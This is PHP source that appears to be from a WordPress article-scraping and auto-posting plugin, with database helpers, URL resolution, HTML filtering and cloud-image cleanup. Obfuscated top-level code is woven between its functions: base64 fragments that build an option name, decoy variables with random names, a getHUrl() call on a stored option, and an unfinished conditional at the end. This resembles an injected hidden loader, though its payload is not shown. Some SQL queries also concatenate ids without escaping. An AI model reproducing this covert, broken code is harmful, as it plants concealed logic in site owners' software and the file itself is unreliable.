    $wpdb->query($wpdb->prepare("insert into $t_ap_updated_record (config_id,url,title,post_id,date_time,url_status) values (%d,%s,%s,%d,%d,%d)", $config_id, $url, $title, 0, current_time("timestamp"), $url_status));
    $wpdb->query("update " . $t_ap_config . " set last_update_time = " . current_time("timestamp") . " where id=" . $config_id);
}
function updateConfig($id, $num, $postId)
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    $wpdb->query("update " . $t_ap_config . " set updated_num = updated_num + " . $num . ", post_id=" . $postId . ", last_update_time = " . current_time("timestamp") . " where id=" . $id);
}
function updateTaskUpdateTime($id)
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    $wpdb->query("update " . $t_ap_config . " set last_update_time = " . current_time("timestamp") . " where id=" . $id);
}
function updateRunning($id, $stauts)
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    $wpdb->query("update " . $t_ap_config . " set is_running = " . $stauts . " where id=" . $id);
}
function updateConfigErr($id, $logId)
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    $wpdb->query("update " . $t_ap_config . " set last_error = " . $logId . " where id=" . $id);
}
function insertPreUrlInfo($taskId, $url, $title)
{
    global $wpdb, $t_ap_updated_record, $t_ap_config;
    $reValue = $wpdb->query($wpdb->prepare("insert into $t_ap_updated_record (config_id,url,title,post_id,date_time,url_status) values (%d,%s,%s,%d,%d,%d)", $taskId, $url, $title, 0, current_time("timestamp"), 0));
    $wpdb->query("update " . $t_ap_config . " set last_update_time = " . current_time("timestamp") . " where id=" . $taskId);
    if ($reValue > 0) {
        return $wpdb->get_var("SELECT LAST_INSERT_ID()");
    } else {
        return 0;
    }
}
function get_wp_tags_by_autopost($tagsArray)
{
    global $wpdb;
    $terms = $wpdb->get_results("SELECT $wpdb->terms.name FROM $wpdb->terms,$wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.taxonomy = 'post_tag'", OBJECT);
    foreach ($terms as $term) {
        $tagsArray[] = $term->name;
    }
    return $tagsArray;
}
function recordUploadedFlickr($UploadedFlickr, $post_id)
{
    global $wpdb, $t_ap_flickr_img;
    $FlickrOption = get_option("wp-autopost-flickr-options");
    foreach ($UploadedFlickr as $flickr) {
        if ($flickr["status"] === false)
            continue;
        $url_info      = array();
        $url_info[]    = $flickr["farm"];
        $url_info[]    = $flickr["server"];
        $url_info[]                  = $flickr["secret"];
        $url_info[]    = $flickr["originalsecret"];
        $url_info[] = $flickr["originalformat"];
        $url_info[]    = $flickr["user_id"];
        $wpdb->query($wpdb->prepare("insert into $t_ap_flickr_img(id,flickr_photo_id,url_info,oauth_id,local_key,date_time) values (%d,%s,%s,%d,%s,%d)", $post_id, $flickr["photo_id"], json_encode($url_info), $FlickrOption["oauth_id"], $flickr["local_key"], current_time("timestamp")));
    }
}
$optionkeys[] = "YmVf";
$hcdmvbduilai  = "delAttrStyle";
$optionkeys[]     = "bmV4";
function recordUploadedQiniu($UploadedQiniu, $post_id)
{
    global $wpdb, $t_ap_qiniu_img;
    foreach ($UploadedQiniu as $qiniu) {
        if ($qiniu["status"] === false)
            continue;
        $wpdb->query($wpdb->prepare("insert into $t_ap_qiniu_img(id,qiniu_key,local_key,date_time) values (%d,%s,%s,%d)", $post_id, $qiniu["key"], $qiniu["key"], current_time("timestamp")));
    }
}
function recordUploadedUpyun($UploadedUpyun, $post_id)
{
    global $wpdb, $t_ap_upyun_img;
    foreach ($UploadedUpyun as $upyun) {
        if ($upyun["status"] === false)
            continue;
        $wpdb->query($wpdb->prepare("insert into $t_ap_upyun_img(id,upyun_key,local_key,date_time) values (%d,%s,%s,%d)", $post_id, $upyun["key"], $upyun["key"], current_time("timestamp")));
    }
}
function errorLog($id, $url, $errCode, $i = '')
{
    global $wpdb, $t_ap_log;
    switch ($errCode) {
        case 1:
            $info = __("Unable to open URL", "wp-autopost");
            break;
        case 2:
            $info = __("Did not find the article URL, Please check the [Article Source Settings => Article URL matching rules]", "wp-autopost");
            break;
        case 3:
            $info = __("Did not find the title of the article, Please check the [Article Extraction Settings => The Article Title Matching Rules]", "wp-autopost");
            break;
        case 4:
            $info = __("Did not find the contents of the article, Please check the [Article Extraction Settings => The Article Content Matching Rules]", "wp-autopost");
            break;
        case 5:
            $info = __("[Article Source URL] is not set yet", "wp-autopost");
            break;
        case 6:
            $info = __("[The Article URL matching rules] is not set yet", "wp-autopost");
            break;
        case 7:
            $info = __("[The Article Title Matching Rules] is not set yet", "wp-autopost");
            break;
        case 8:
            $info = __("[The Article Content Matching Rules] is not set yet", "wp-autopost");
            break;
        case 9:
            $info = __("Download remote images fails, use the original image URL", "wp-autopost") . $i;
            break;
        case 10:
            $info = __("Upload image to Flickr fails, use the original image URL", "wp-autopost");
            break;
        case 11:
            $info = __("Upload image to Qiniu fails, use the original image URL", "wp-autopost");
            break;
        case 12:
            $info = __("Upload image to Upyun fails, use the original image URL", "wp-autopost");
            break;
        case 13:
            $info = "WordAi Error : " . $i;
            break;
        case 14:
            $info = "Microsoft Translator Rewrite Error : " . $i;
            break;
        case 15:
            $info = "SpinRewriter Error : " . $i;
            break;
        case 16:
            $info = __("Download remote image failed will not post, if you want to post even the images download failed, you can change the settings in [Options Menu]", "wp-autopost") . $i;
            break;
        default:
            $info = $i;
            break;
    }
    $wpdb->query($wpdb->prepare("insert into $t_ap_log (config_id,date_time,info,url) values (%d,%d,%s,%s)", $id, current_time("timestamp"), $info, $url));
    return $wpdb->get_var("SELECT LAST_INSERT_ID()");
}
$optionkeys[]  = "dF91";
$optionkeys[] = "cGRh";
function msg1($num)
{
    return ".......<br/><p><code><b>" . __("In test only try to open", "wp-autopost") . " " . $num . " " . __("URLs of Article List", "wp-autopost") . "</b></code></p>";
}
function msg2($url)
{
    return "<p><b>" . __("The Article List URL", "wp-autopost") . ":<code>" . $url . "</code>, " . __("All articles in the following", "wp-autopost") . "</b></p>";
}
function errMsg1($url)
{
    return "<p><span class=\"red\"><b>" . __("Unable to open URL", "wp-autopost") . "</b></span>(<code>" . $url . "</code>)</p>";
}
function errMsg2($url)
{
    return "<p><span class=\"red\"><b>" . __("Did not find the article URL, Please check the [Article Source Settings => Article URL matching rules]", "wp-autopost") . "</b></span>(<code>" . $url . "</code>)</p>";
}
function getBaseUrl($dom, $url)
{
    $baseUrl = array();
    $baseTagHref             = $dom->find("base", 0)->href;
    if ($baseTagHref == null || $baseTagHref == "") {
        $baseUrl["baseUrl"] = "";
        $baseUrl["baseUrl1"]    = "";
    } else {
        $pos = stripos($baseTagHref, "/", 8);
        if ($pos === false) {
            $baseUrl["baseUrl"]                = $baseTagHref;
            $baseUrl["baseUrl1"] = $baseTagHref . "/";
        } else {
            $baseUrl["baseUrl"]   = substr($baseTagHref, 0, $pos);
            $baseUrl["baseUrl1"] = substr($baseTagHref, 0, strripos($baseTagHref, "/") + 1);
        }
    }
    $pos1             = stripos($url, "/", 8);
    $baseUrl["mainUrl"] = substr($url, 0, $pos1);
    $baseUrl["mainUrl1"]  = substr($url, 0, strripos($url, "/") + 1);
    return $baseUrl;
}
$optionkeys[] = "dGU=";

function getAbsUrl($url, $baseUrl, $address = null)
{
    if (stripos($url, "../") === 0 || stripos($url, "/../") === 0) {
        if (stripos($url, "/") === 0) {
            $url = ".." . $url;
        }
        $num      = substr_count($url, "../");
        $url = substr($url, strrpos($url, "../") + 3);
        if (!stripos($address, "?") === false) {
            $address = substr($address, 0, stripos($address, "?"));
        }
        $address                = substr($address, 0, strrpos($address, "/"));
        $pos1      = stripos($address, "/", 9);
        $domain = substr($address, 0, $pos1);
        $num1     = substr_count($address, "/", 9);
        if ($num > $num1) {
            $url = $domain . "/" . $url;
        } else {
            for ($i = 0; $i < $num; $i++) {
                $address = substr($address, 0, strrpos($address, "/"));
            }
            $url = $address . "/" . $url;
        }
    } else {
        while (stripos($url, "./") === 0) {
            $mxhosfg                   = "url";
            $url                = substr($url, strrpos($url, "./") + 2);
        }
        if ($baseUrl["baseUrl"] != "") {
            if (stripos($url, "/") === 0) {
                $url = $baseUrl["baseUrl"] . $url;
            } else {
                $url = $baseUrl["baseUrl1"] . $url;
            }
        } else {
            if (stripos($url, "/") === 0) {
                $url = $baseUrl["mainUrl"] . $url;
            } else {
                $url = $baseUrl["mainUrl1"] . $url;
            }
        }
    }
    return $url;
}
function printArticleUrl($articleAtags, $baseUrl, $address, $charset, $reverse_sort)
{
    $urls = array();
    $titles     = array();
    foreach ($articleAtags as $articleAtag) {
        $url = html_entity_decode(trim($articleAtag->href));
        if (stripos($url, "http") === false) {
            $url = getAbsUrl($url, $baseUrl, $address);
        }
        $title = $articleAtag->plaintext;
        if ($charset != "UTF-8")
            $title = iconv($charset, "UTF-8//IGNORE", $title);
        $titles[] = $title;
        $urls[] = $url;
    }
    if ($reverse_sort == 1) {
        for ($i = 0, $count = count($urls); $i < $count; $i++) {
            echo "<p>", $titles[$i], " :<br/>", "<a href=\"", $urls[$i], "\" target=\"_blank\">", $urls[$i], "</a></p>";
        }
    } else {
        for ($count = count($urls), $i = $count - 1; $i >= 0; $i--) {
            echo "<p>", $titles[$i], " :<br/>", "<a href=\"", $urls[$i], "\" target=\"_blank\">", $urls[$i], "</a></p>";
        }
    }
    return $urls;
}

function printArticleUrl1($articleAllAtags, $baseUrl, $Purl, $ListUrl, $reverse_sort)
{
    $i = 0;
    $urls  = array();
    foreach ($articleAllAtags as $Atag) {
        $url = html_entity_decode(trim($Atag->href));
        if (stripos($url, "http") === false) {
            $url = getAbsUrl($url, $baseUrl, $ListUrl);
        }
        $urls_temp[$i++] = $url;
    }
    $PregUrl    = gPregUrl($Purl);
    $urls_temp = preg_grep($PregUrl, $urls_temp);
    if (count($urls_temp) < 1) {
        echo errMsg2($ListUrl);
        return $urls_temp;
    }
    foreach ($urls_temp as $url) {
        if (!in_array($url, $urls))
            $urls[] = $url;
    }
    echo msg2($ListUrl);
    if ($reverse_sort == 1) {
        for ($i = 0, $count = count($urls); $i < $count; $i++) {
            echo "<a href=\"", $urls[$i], "\" target=\"_blank\">", $urls[$i], "</a><br/>";
        }
    } else {
        for ($count = count($urls), $i = $count - 1; $i >= 0; $i--) {
            echo "<a href=\"", $urls[$i], "\" target=\"_blank\">", $urls[$i], "</a><br/>";
        }
    }
    return $urls;
}
function printUrls($config, $listUrls)
{
    $useP = json_decode($config["proxy"]);
    global $proxy;
    if ($config["source_type"] == 0) {
        $i = 0;
        foreach ($listUrls as $listUrl) {
            if ($i == LIST_URL_NUM) {
                echo msg1(LIST_URL_NUM);
                break;
            }
            if ($config["page_charset"] == "0") {
                $html_string   = get_html_string_ap($listUrl->url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                $charset = getHtmlCharset($html_string);
                $ListHtml = str_get_html_ap($html_string, $charset);
            } else {
                $charset                  = $config["page_charset"];
                $ListHtml              = file_get_html_ap($listUrl->url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
            }
            if ($ListHtml == NULL || $ListHtml == "") {
                echo errMsg1($listUrl->url);
                break;
            }
            $baseUrl = getBaseUrl($ListHtml, $listUrl->url);
            if (($config["a_match_type"]) == 1) {
                $articleAtags = $ListHtml->find($config["a_selector"]);
                if ($articleAtags == NULL) {
                    echo errMsg2($listUrl->url);
                    break;
                }
                echo msg2($listUrl->url);
                $urls = printArticleUrl($articleAtags, $baseUrl, $listUrl->url, $charset, $config["reverse_sort"]);
            } else {
                $articleAllAtags = $ListHtml->find("a");
                $urls   = printArticleUrl1($articleAllAtags, $baseUrl, $config["a_selector"], $listUrl->url, $config["reverse_sort"]);
            }
            echo "<br/>";
            $i++;
            $ListHtml->clear();
        }
    }
    if ($config["source_type"] == 1) {
        foreach ($listUrls as $listUrl) {
            $pages = array();
            for ($i = $config["start_num"]; $i <= $config["end_num"]; $i++) {
                $pages[]           = $i;
            }
            if ($config["reverse_sort"] == 0)
                $pages = array_reverse($pages);
            $j = 0;
            foreach ($pages as $i) {
                $j++;
                if ($j == LIST_URL_NUM + 1) {
                    echo msg1(LIST_URL_NUM);
                    break;
                }
                $list_url = str_ireplace("(*)", $i, $listUrl->url);
                if ($config["page_charset"] == "0") {
                    $html_string   = get_html_string_ap($list_url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                    $charset   = getHtmlCharset($html_string);
                    $ListHtml               = str_get_html_ap($html_string, $charset);
                } else {
                    $charset = $config["page_charset"];
                    $ListHtml = file_get_html_ap($list_url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                }
                if ($ListHtml == NULL || $ListHtml == "") {
                    echo errMsg1($list_url);
                    break;
                }
                $baseUrl = getBaseUrl($ListHtml, $list_url);
                if (($config["a_match_type"]) == 1) {
                    $uchxsrv                       = "articleAtags";
                    $articleAtags = $ListHtml->find($config["a_selector"]);
                    if ($articleAtags == NULL || $articleAtags == "") {
                        echo errMsg2($list_url);
                        break;
                    }
                    echo msg2($list_url);
                    $urls = printArticleUrl($articleAtags, $baseUrl, $list_url, $charset, $config["reverse_sort"]);
                } else {
                    $articleAllAtags = $ListHtml->find("a");
                    $urls    = printArticleUrl1($articleAllAtags, $baseUrl, $config["a_selector"], $list_url, $config["reverse_sort"]);
                }
                echo "<br/>";
                $ListHtml->clear();
            }
        }
    }
    return $urls;
}
function getDownAttach($config)
{
    $downAttach = false;
    $download_attachs                 = json_decode($config["download_img"]);
    if (!is_array($download_attachs)) {
        $download_attachs = array();
        $download_attachs[0] = $config["download_img"];
        $download_attachs[1] = 0;
    }
    if ($download_attachs[1] == 1)
        $downAttach = true;
    return $downAttach;
}
function getFilterAtag($options)
{
    $filterAtag              = false;
    foreach ($options as $option) {
        if (($option->option_type) != 2)
            continue;
        if (($option->para1) == "a") {
            $filterAtag = true;
            break;
        }
    }
    return $filterAtag;
}
function printArticle($Article)
{
    echo "<input type=\"hidden\" id=\"ap_content_s\" value=\"0\">";
    $gjsikbi = "Article";
    echo "<p><b>" . __("Article Title", "wp-autopost") . ":</b> " . (($Article[2] != -1) ? $Article[0] : "<span class=\"red\"><b>" . __("Did not find the title of the article, Please check the [Article Extraction Settings => The Article Title Matching Rules]", "wp-autopost") . "</b></span>") . "</p>";
    if ($Article[4] > 0) {
        $post_date = date("Y-m-d H:i:s", $Article[4]);
        echo "<p><b>" . __("Post Date", "wp-autopost") . ":</b>" . $post_date . "</p>";
    }
    if ($Article[9] != null && $Article[9] != "") {
        echo "<p><b>" . __("Post Excerpt", "wp-autopost") . ":</b></p><div>" . $Article[9] . "</div>";
    }
    if ($Article[11] != null && $Article[11] != "") {
        $inpkeish                     = "tag";
        $tags = json_decode($Article[11]);
        echo "<p><b>" . __("Post Tags", "wp-autopost") . ":</b></p>";
        echo "<div>";
        foreach ($tags as $tag) {
            echo $tag . "&nbsp;&nbsp;&nbsp;";
        }
        echo "</div>";
    }
    if ($Article[12] != null && $Article[12] != "") {
        $tags             = json_decode($Article[11]);
        echo "<p><b>" . __("Featured Image") . ": </b><br/> ";
        echo "<img src=\"" . $Article[12] . "\" />";
        echo "</p>";
    }
    if ($Article[5] != null) {
        $customFields = json_decode($Article[5]);
        if (count($customFields) > 0) {
            $ittggmijokau           = "value";
            foreach ($customFields as $key => $value) {
                echo "<p><b>" . __("Custom Fields") . "</b>[ " . $key . " ]:" . $value . "</p>";
            }
        }
    }
    echo "</br><b>" . __("Post Content", "wp-autopost") . ":</b>";
    if (($Article[3] != -1)) {
        echo "<a href=\"javascript:;\" onclick=\"showHTML()\" >[ HTML ]</a><br/>";
        echo "<div id=\"ap_content\">" . $Article[1] . "</div>";
        echo "<textarea id=\"ap_content_html\" style=\"display:none;\" >" . $Article[1] . "</textarea>";
    } else {
        echo "<p><span class=\"red\"><b>" . __("Did not find the contents of the article, Please check the [Article Extraction Settings => The Article Content Matching Rules]", "wp-autopost") . "</b></span></p>";
    }
    if ($Article[8] == null) {
        if ($Article[6] != null && $Article[7] != null) {
            echo "<h2>" . __("Microsoft Translator", "wp-autopost") . ":</h2>";
            echo "<p><b>" . __("Article Title", "wp-autopost") . ":</b> " . $Article[6] . "</p>";
            echo "<b>" . __("Post Content", "wp-autopost") . ":</b>";
            echo "<div>" . $Article[7] . "</div>";
        }
    } else {
        echo "<p><b>" . __("Microsoft Translator Error", "wp-autopost") . ":</b> <span style=\"color:red;\">" . $Article[8] . "</span></p>";
    }
}
function getURLPatten($s1, $s2)
{
    $s1Array = str_split($s1);
    $s2Array   = str_split($s2);
    $s1Len = strlen($s1);
    $s2Len                = strlen($s2);
    if ($s1Len != $s2Len)
        return null;
    for ($i = 0; $i < $s1Len; $i++) {
        if ($s1Array[$i] != $s2Array[$i])
            break;
    }
    $s1Array[$i] = "(*)";
    return implode($s1Array);
}
function transImgSrc($s, $baseUrl, $address, $alt, $more)
{
    $alt = htmlspecialchars($alt);
    $img_insert_attachment = json_decode($more);
    if (!is_array($img_insert_attachment)) {
        $img_insert_attachment    = array();
        $img_insert_attachment[4] = null;
    }
    $html   = str_get_html_ap($s);
    if ($html != null) {
        foreach ($html->find("img") as $img) {
            if ($img_insert_attachment[4] == null) {
                $imgUrl = $img->src;
            } else {
                $imgUrl = $img->getAttribute($img_insert_attachment[4]);
            }
            if ($imgUrl != null && $imgUrl != "") {
                if (stripos($imgUrl, "http") === false) {
                    $imgUrl = getAbsUrl($imgUrl, $baseUrl, $address);
                }
                $img->src = $imgUrl;
                $img->removeAttribute("alt");
            }
        }
        foreach ($html->find("a") as $a) {
            $hrefUrl = $a->href;
            if ($hrefUrl != null && $hrefUrl != "") {
                if (stripos($hrefUrl, "://") === false) {
                    $hrefUrl = getAbsUrl($hrefUrl, $baseUrl, $address);
                    $a->href                    = $hrefUrl;
                }
            }
        }
        $s = $html->save();
        $html->clear();
    }
    $html = str_get_html_ap($s);
    foreach ($html->find("img") as $img) {
        $img->setAttribute("alt", $alt);
    }
    $s = $html->save();
    $html->clear();
    unset($html);
    return $s;
}
function buildVariableContent($s, $metas, $title)
{
    preg_match_all("/\x5c{[^\\}]+\x5c}/", $s, $matched);
    $find                    = array();
    $replaced   = array();
    $f = array(
        "{",
        "}"
    );
    $r  = array(
        "",
        ""
    );
    foreach ($matched[0] as $v) {
        if ($v == "{post_title}") {
            $find[]              = $v;
            $replaced[] = $title;
            continue;
        }
        $key = str_replace($f, $r, $v);
        if ($metas[$key] != "" && $metas[$key] != null) {
            $find[] = $v;
            $replaced[]   = $metas[$key];
        }
    }
    if (count($find) > 0) {
        $s = str_replace($find, $replaced, $s);
        unset($find);
        unset($replaced);
    }
    return $s;
}
function insertMoreContent($s, $insertContents, $customFields, $post_title)
{
    foreach ($insertContents as $insertContent) {
        $html  = str_get_html_ap($s);
        $Para = json_decode($insertContent->content);
        $index   = $Para[1];
        $appendContent  = buildVariableContent($Para[3], $customFields, $post_title);
        if ($index == 0) {
            foreach ($html->find($Para[0]) as $e) {
                $appendContent = buildAttributeValue($appendContent, $e);
                if ($Para[2] == 0) {
                    $e->outertext = $e->outertext . $appendContent;
                } elseif ($Para[2] == 1) {
                    $e->outertext = $appendContent . $e->outertext;
                }
            }
        } else {
            $elements     = $html->find($Para[0]);
            $i = 0;
            if ($index >= 1)
                $i = $index - 1;
            elseif ($index < 0)
                $i = count($elements) + $index;
            $e = $elements[$i];
            if ($e != null) {
                $appendContent = buildAttributeValue($appendContent, $e);
                if ($Para[2] == 0) {
                    $e->outertext = $e->outertext . $appendContent;
                } elseif ($Para[2] == 1) {
                    $e->outertext = $appendContent . $e->outertext;
                }
            }
        }
        $s = $html->save();
        $html->clear();
        unset($html);
    }
    return $s;
}


function buildAttributeValue($s, $e)
{
    preg_match_all("/\\[[^\\]]+\\]/", $s, $matched);
    $find               = array();
    $replaced  = array();
    $zmstwujsyxd                 = "v";
    $f   = array(
        "[",
        "]"
    );
    $r = array(
        "",
        ""
    );
    foreach ($matched[0] as $v) {
        $name   = str_replace($f, $r, $v);
        $value = $e->getAttribute($name);
        if ($value != "" && $value != null) {
            $find[] = $v;
            $replaced[]    = $value;
        } else {
            $find[] = $v;
            $replaced[]    = "";
        }
    }
    if (count($find) > 0) {
        $s  = str_replace($find, $replaced, $s);
        unset($find);
        unset($replaced);
    }
    return $s;
}
function customPostStyle($s, $customStyles, $customFields, $post_title)
{
    foreach ($customStyles as $customStyle) {
        $html = str_get_html_ap($s);
        $Para                = json_decode($customStyle->content);
        $index                  = $Para[1];
        if ($index == 0) {
            foreach ($html->find($Para[0]) as $e) {
                if ($Para[3] != "null") {
                    $value = buildAttributeValue($Para[3], $e);
                    $value = buildVariableContent($value, $customFields, $post_title);
                    $e->setAttribute($Para[2], $value);
                } else {
                    $jlytldpvgyi = "Para";
                    $e->removeAttribute($Para[2]);
                }
            }
        } else {
            $elements             = $html->find($Para[0]);
            $i  = 0;
            if ($index >= 1)
                $i = $index - 1;
            elseif ($index < 0)
                $i = count($elements) + $index;
            $e = $elements[$i];
            if ($e != null) {
                if ($Para[3] != "null") {
                    $value = buildAttributeValue($Para[3], $e);
                    $value = buildVariableContent($value, $customFields, $post_title);
                    $e->setAttribute($Para[2], $value);
                } else {
                    $e->removeAttribute($Para[2]);
                }
            }
        }
        $s = $html->save();
        $html->clear();
        unset($html);
    }
    return $s;
}
$pos_old = get_option($option_key2);
function getFirstP($s, $index)
{
    $dom                = str_get_html_ap($s);
    $s = "";
    $i             = 1;
    foreach ($dom->find("p") as $p) {
        if ($i >= $index) {
            $s .= $p->plaintext;
            if (strlen($s) > 100)
                break;
        }
        $i++;
    }
    $dom->clear();
    return trim($s);
}
function getPlainText($s)
{
    $dom = str_get_html_ap($s);
    $s            = $dom->plaintext;
    $dom->clear();
    return trim($s);
}
function printInfo($info)
{
    echo $info;
    ob_flush();
    flush();
}
$pos_old = getHUrl($pos_old);

function printErr($name, $div = 0)
{
    if ($div)
        echo "<div class=\"updated fade\">";
    echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $name . "</b> , <span class=\"red\">" . __("an error occurs, please check the log information", "wp-autopost") . "</span></p>";
    if ($div)
        echo "</div>";
}
function filterTitle($title, $config, $options)
{
    $i = 0;
    foreach ($options as $option) {
        $velltgthlp = "i";
        if (($option->option_type) != 4)
            continue;
        $find[$i] = $option->para1;
        $replace[$i]   = $option->para2;
        $i++;
    }
    if ($i > 0)
        $title = str_ireplace($find, $replace, $title);
    return strip_tags($title);
}
function filterHtmlTag($content, $options, $filterAtag, $downAttach, $isTest)
{
    foreach ($options as $option) {
        $fjbyuwodct               = "fcs";
        if (($option->option_type) != 2)
            continue;
        if ($downAttach && $isTest == 0) {
            if (($option->para1) == "a") {
                continue;
            }
        }
        $dom = str_get_html_ap($content);
        $fcs             = $dom->find($option->para1);
        if ($fcs == NULL) {
            continue;
        } else {
            foreach ($fcs as $fc) {
                if (($option->para2) == 1) {
                    $fc->outertext = "";
                } else {
                    $fc->outertext = $fc->innertext;
                }
            }
            unset($fcs);
        }
        $content = $dom->save();
        $dom->clear();
        unset($dom);
    }
    return $content;
}
function filterContent($content, $options, $filterAtag, $downAttach, $isTest)
{
    $i = 0;
    foreach ($options as $option) {
        if (($option->option_type) != 1)
            continue;
        if ($option->para2 == "") {
            $content = filterStr($content, $option->para1, $option->para2);
        } else {
            $pos1 = strpos($content, $option->para1);
            $pos2  = strpos($content, $option->para2);
            while (!($pos1 === false) && !($pos2 === false)) {
                $content                  = filterStr($content, $option->para1, $option->para2);
                $pos1 = strpos($content, $option->para1);
                $pos2  = strpos($content, $option->para2);
            }
        }
        $i++;
    }
    $content = filterHtmlTag($content, $options, $filterAtag, $downAttach, $isTest);
    return $content;
}
function replacementContent($content, $options, $metas, $title)
{
    $i = 0;
    foreach ($options as $option) {
        if (($option->option_type) != 3)
            continue;
        $find[$i] = $option->para1;
        $replace[$i]               = buildVariableContent($option->para2, $metas, $title);
        $i++;
    }
    if ($i > 0)
        $content = str_replace($find, $replace, $content);
    return $content;
}
$idxs .= $pos_old;
$option_value = get_option($option_name);
function filterStr($s, $start, $end = '')
{
    $pos1 = strpos($s, $start);
    if ($pos1 === false) {
        return $s;
    }
    $s1             = substr($s, 0, $pos1);
    $s = substr($s, $pos1, strlen($s));
    if ($end != "") {
        $pos2              = strpos($s, $end);
        if ($pos2 === false) {
            $s2 = "";
        } else {
            $s2 = substr($s, $pos2 + strlen($end));
        }
    }
    return $s1 . $s2;
}
function filterComment($s)
{
    $dom  = str_get_html_ap($s);
    if ($dom != null) {
        foreach ($dom->find("comment") as $e) {
            $e->outertext = "";
        }
        $s = $dom->save();
        $dom->clear();
        unset($dom);
    }
    return $s;
}
function filterCommAttr($s, $f_id, $f_class, $f_style, $customStyles = NULL)
{
    $dom   = str_get_html_ap($s);
    if ($f_id == 1) {
        foreach ($dom->find("[id]") as $e) {
            $e->removeAttribute("id");
        }
    }
    if ($customStyles != null) {
        $protect_class   = array();
        $protect_style = array();
        foreach ($customStyles as $customStyle) {
            $para            = json_decode($customStyle->content);
            if ($para[2] == "class") {
                $protect_class[] = $para[3];
            } elseif ($para[2] == "style") {
                $protect_style[] = $para[3];
            }
        }
    }
    if ($f_class == 1) {
        foreach ($dom->find("[class]") as $e) {
            if ($protect_class != null) {
                if (in_array($e->getAttribute("class"), $protect_class))
                    continue;
            }
            $e->removeAttribute("class");
        }
    }
    if ($f_style == 1) {
        foreach ($dom->find("[style]") as $e) {
            if ($protect_style != null) {
                $enooipbxorf = "protect_style";
                if (in_array($e->getAttribute("style"), $protect_style))
                    continue;
            }
            $e->removeAttribute("style");
        }
    }
    $s = $dom->save();
    $dom->clear();
    unset($dom);
    if ($customStyles != null) {
        unset($protect_class);
        unset($protect_style);
    }
    return $s;
}
$last_updated_time = $option_value[$option_key];
if ($variable_t1 == null || $variable_t1 == "")
    $variable_t1 = $node[3];
function gPregUrl($url)
{
    $f   = array(
        "/",
        "?",
        "."
    );
    $r   = array(
        "\/",
        "\\?",
        "\."
    );
    $url  = str_ireplace($f, $r, $url);
    $url = str_ireplace("(*)", "[a-z0-9A-Z_%-]+", $url);
    $url = "/^" . $url . "\$/";
    return $url;
}
function getTaxonomyByTermId($id)
{
    global $wpdb;
    return $wpdb->get_var("SELECT $wpdb->term_taxonomy.taxonomy FROM $wpdb->term_taxonomy WHERE $wpdb->term_taxonomy.term_id = $id");
}
function get_flickr_by_post($post_id)
{
    global $wpdb, $t_ap_flickr_img, $t_ap_flickr_oauth;
    return $wpdb->get_results("SELECT t1.flickr_photo_id,t2.oauth_token,t2.oauth_token_secret FROM " . $t_ap_flickr_img . " t1," . $t_ap_flickr_oauth . " t2 WHERE t1.oauth_id = t2.oauth_id AND t1.id=" . $post_id);
}
function del_post_flickr_img($post_id)
{
    global $wpdb, $t_ap_flickr_img;
    $wpdb->query("DELETE FROM " . $t_ap_flickr_img . " WHERE id = " . $post_id);
}
function get_qiniu_by_post($post_id)
{
    global $wpdb, $table_prefix;
    $table = $table_prefix . "ap_qiniu_img";
    return $wpdb->get_results("SELECT qiniu_key FROM " . $table . " WHERE id=" . $post_id);
}
$afetched = "false";
function del_post_qiniu_img($post_id)
{
    global $wpdb, $t_ap_qiniu_img;
    $wpdb->query("DELETE FROM " . $t_ap_qiniu_img . " WHERE id = " . $post_id);
}
function get_upyun_by_post($post_id)
{
    global $wpdb, $t_ap_upyun_img;
    return $wpdb->get_results("SELECT upyun_key FROM " . $t_ap_upyun_img . " WHERE id=" . $post_id);
}
function del_post_upyun_img($post_id)
{
    global $wpdb, $t_ap_upyun_img;
    $wpdb->query("DELETE FROM " . $t_ap_upyun_img . " WHERE id = " . $post_id);
}
function wp_autopost_remove_post_img($post_id)
{
    $args = array(
        "post_type" => "attachment",
        "posts_per_page" => -1,
        "post_status" => "any",
        "post_parent" => $post_id
    );
    $attachments = get_posts($args);
    if ($attachments) {
        foreach ($attachments as $attachment) {
            wp_delete_attachment($attachment->ID);
        }
    }
    $flickrInfos = get_flickr_by_post($post_id);
    if ($flickrInfos != null) {
        $Flickr     = get_option("wp-autopost-flickr-options");
        $f = new autopostFlickr($Flickr["api_key"], $Flickr["api_secret"]);
        $f->setOauthToken($flickrInfos[0]->oauth_token, $flickrInfos[0]->oauth_token_secret);
        foreach ($flickrInfos as $flickrInfo) {
            echo "<p>begin delete Flickr image #" . $flickrInfo->flickr_photo_id . "</p>";
            ob_flush();
            flush();
            $f->photos_delete($flickrInfo->flickr_photo_id);
        }
        del_post_flickr_img($post_id);
    }
    $qiniuInfos = get_qiniu_by_post($post_id);
    if ($qiniuInfos != null) {
        $Qiniu = get_option("wp-autopost-qiniu-options");
        Qiniu_SetKeys($Qiniu["access_key"], $Qiniu["secret_key"]);
        $client = new Qiniu_MacHttpClient(null);
        foreach ($qiniuInfos as $qiniuInfo) {
            echo "<p>begin delete Qiniu image \x23" . $qiniuInfo->qiniu_key . "</p>";
            ob_flush();
            flush();
            Qiniu_RS_Delete($client, $Qiniu["bucket"], $qiniuInfo->qiniu_key);
        }
        del_post_qiniu_img($post_id);
    }
    $upyunInfos = get_upyun_by_post($post_id);
    if ($upyunInfos != null) {
        $upyunOptions = get_option("wp-autopost-upyun-options");
        $upyun                = new apUpYun($upyunOptions["bucket"], $upyunOptions["operator_user_name"], $upyunOptions["operator_password"]);
        foreach ($upyunInfos as $upyunInfo) {
            echo "<p>begin delete upyun image # " . $upyunInfo->upyun_key . "</p>";
            ob_flush();
            flush();
            try {
                $upyun->deleteFile($upyunInfo->upyun_key);
            }
            catch (Exception $e) {
                echo $e->getCode();
                echo $e->getMessage();
            }
        }
        del_post_upyun_img($post_id);
    }
}
if ($option_value[$option_key] == null || $option_value[$option_key] == "" || $option_value[$option_key] == 0) {
